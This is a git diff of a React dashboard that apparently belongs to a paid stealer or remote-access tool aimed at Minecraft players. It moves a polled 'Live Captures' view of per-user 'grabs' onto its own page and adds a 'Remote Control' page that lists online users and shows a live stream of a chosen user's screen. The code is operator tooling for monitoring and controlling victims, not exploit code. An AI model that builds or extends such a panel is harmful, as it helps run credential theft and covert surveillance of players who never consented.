@@ -298,24 +298,16 @@ function RepPage({ username, userEmail }) {
   );
 }
 
-function LiveCaptures() {
-  const [grabs, setGrabs] = useState([]);
+function RemoteControl() {
   const [onlineUsers, setOnlineUsers] = useState([]);
-  const [loading, setLoading] = useState(true);
   const [viewingStream, setViewingStream] = useState(null);
   const [streamFrame, setStreamFrame] = useState(null);
-  const [remoteOpen, setRemoteOpen] = useState(false);
 
   useEffect(() => {
-    fetch('/api/grabs/live')
-      .then(r => r.json())
-      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
-      .catch(() => setLoading(false));
-    const interval = setInterval(() => {
-      fetch('/api/grabs/live').then(r => r.json()).then(d => setGrabs(d.grabs || [])).catch(() => {});
+    const iv = setInterval(() => {
       fetch('/api/stream').then(r => r.json()).then(d => setOnlineUsers(d.online || [])).catch(() => {});
     }, 3000);
-    return () => clearInterval(interval);
+    return () => clearInterval(iv);
   }, []);
 
   useEffect(() => {
@@ -329,43 +321,36 @@ function LiveCaptures() {
     return () => clearInterval(iv);
   }, [viewingStream]);
 
-  const totalCaptures = grabs.reduce((s, g) => s + g.count, 0);
-
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
         <div>
-          <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Live Captures</h1>
-          <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{totalCaptures} captures from {grabs.length} users</p>
-        </div>
-        <div onClick={() => setRemoteOpen(!remoteOpen)} style={{ cursor: 'pointer', background: remoteOpen ? colors.green : colors.panel, color: remoteOpen ? '#000' : colors.text, border: '1px solid ' + (remoteOpen ? colors.green : colors.border), borderRadius: 8, padding: '8px 16px', fontSize: 13, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 6 }}>
-          Remote Control {onlineUsers.length > 0 && <span style={{ background: remoteOpen ? '#000' : colors.green, color: remoteOpen ? colors.green : '#000', borderRadius: 10, padding: '1px 7px', fontSize: 11 }}>{onlineUsers.length}</span>}
+          <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Remote Control</h1>
+          <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{onlineUsers.length} users online</p>
         </div>
       </div>
 
-      {remoteOpen && (
-        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 12, padding: 20, marginBottom: 20 }}>
-          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14 }}>Online Users</div>
-          {onlineUsers.length === 0 ? (
-            <div style={{ color: colors.textDim, fontSize: 13 }}>No users online</div>
-          ) : (
-            <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
-              {onlineUsers.map(u => (
-                <div key={u.username} onClick={() => setViewingStream(viewingStream === u.username ? null : u.username)} style={{ cursor: 'pointer', background: viewingStream === u.username ? '#1a2a1a' : '#1a1b24', border: '1px solid ' + (viewingStream === u.username ? colors.green : colors.border), borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10 }}>
-                  <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
-                  <div>
-                    <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
-                    <div style={{ fontSize: 11, color: colors.green }}>Live</div>
-                  </div>
-                </div>
-              ))}
+      {onlineUsers.length === 0 ? (
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
+          <span style={{ fontSize: 28, marginBottom: 8 }}>No users online</span>
+          <span style={{ fontSize: 13 }}>Users will appear here when they join a server</span>
+        </div>
+      ) : (
+        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap', marginBottom: 20 }}>
+          {onlineUsers.map(u => (
+            <div key={u.username} onClick={() => setViewingStream(viewingStream === u.username ? null : u.username)} style={{ cursor: 'pointer', background: viewingStream === u.username ? '#1a2a1a' : colors.panel, border: '1px solid ' + (viewingStream === u.username ? colors.green : colors.border), borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10, transition: 'all 0.15s' }}>
+              <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
+              <div>
+                <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
+                <div style={{ fontSize: 11, color: colors.green }}>Live</div>
+              </div>
             </div>
-          )}
+          ))}
         </div>
       )}
 
       {viewingStream && (
-        <div style={{ background: colors.panel, border: '1px solid ' + colors.green, borderRadius: 12, padding: 16, marginBottom: 20 }}>
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.green, borderRadius: 12, padding: 16 }}>
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
             <div style={{ fontSize: 14, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8 }}>
               <img src={'https://mc-heads.net/avatar/' + viewingStream + '/24'} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
@@ -381,6 +366,33 @@ function LiveCaptures() {
           )}
         </div>
       )}
+    </div>
+  );
+}
+
+function LiveCaptures() {
+  const [grabs, setGrabs] = useState([]);
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    fetch('/api/grabs/live')
+      .then(r => r.json())
+      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
+      .catch(() => setLoading(false));
+    const interval = setInterval(() => {
+      fetch('/api/grabs/live').then(r => r.json()).then(d => setGrabs(d.grabs || [])).catch(() => {});
+    }, 3000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const totalCaptures = grabs.reduce((s, g) => s + g.count, 0);
+
+  return (
+    <div style={{ flex: 1, padding: '28px 36px' }}>
+      <div style={{ marginBottom: 20 }}>
+        <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Live Captures</h1>
+        <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{totalCaptures} captures from {grabs.length} users</p>
+      </div>
 
       <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
         {grabs.map(g => (
@@ -478,6 +490,7 @@ export default function DashboardPage() {
           <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
           <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
           <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
+          <NavItem icon="🖥" label="Remote Control" active={page === 'remote'} onClick={() => setPage('remote')} />
         </div>
         <div>
           <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
@@ -488,6 +501,7 @@ export default function DashboardPage() {
       {page === 'plans' && <Plans />}
       {page === 'rep' && <RepPage username={username} userEmail={userEmail} />}
       {page === 'live' && <LiveCaptures />}
+      {page === 'remote' && <RemoteControl />}
     </div>
   );
 }
